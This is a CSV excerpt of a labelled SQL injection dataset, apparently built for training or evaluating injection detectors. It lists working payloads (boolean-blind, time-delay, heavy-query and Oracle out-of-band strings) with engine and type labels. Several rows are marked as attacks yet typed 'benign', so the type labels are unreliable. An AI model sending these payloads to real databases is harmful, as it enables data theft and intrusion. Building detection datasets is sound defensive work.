row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
2280,"1 where 3799 = 3799 and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",1,,boolean_blind,generic,0.95,3799 = 3799 and detected — boolean_blind injection (priority 8) on generic,rule-based
2281,"-9672' ) ) as rupb where 8218 = 8218 or make_set ( 4954 = 1836,1836 ) --",1,,boolean_blind,generic,0.95,8218 = 8218 or detected — boolean_blind injection (priority 8) on generic,rule-based
2282,"1%"" and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
2283,1'|| ( select 'cfff' where 4994 = 4994,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
2284,1'+ ( select 'jtvq' where 8288 = 8288 and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #,1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
2285,1'+ ( select 'leok' where 4320 = 4320,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
2286,"1'+ ( select 'uijv' where 7279 = 7279 and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",1,,boolean_blind,generic,0.95,7279 = 7279 and detected — boolean_blind injection (priority 8) on generic,rule-based
2287,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ( 1473 = 1473",1,,heavy_query,firebird,0.95,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb detected — heavy_query injection (priority 6) on firebird",rule-based
2288,1%' ) ) ) and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( ( ( '%' = ',1,,out_of_band,oracle,0.95,utl_inaddr detected — out_of_band injection (priority 2) on oracle,rule-based
2289,"-5579%"" ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ""%"" = """,1,,boolean_blind,generic,0.95,) and ( detected — boolean_blind injection (priority 8) on generic,rule-based
2290,1 ) where 2734 = 2734 waitfor delay '0:0:5'--,1,,time_blind,mssql,0.95,waitfor delay is MSSQL-specific time-delay function — time-based blind inference (priority 5),rule-based
2291,1'|| ( select 'qgnz' where 6446 = 6446,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
2292,1' ) ) as nhkp where 8030 = 8030,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
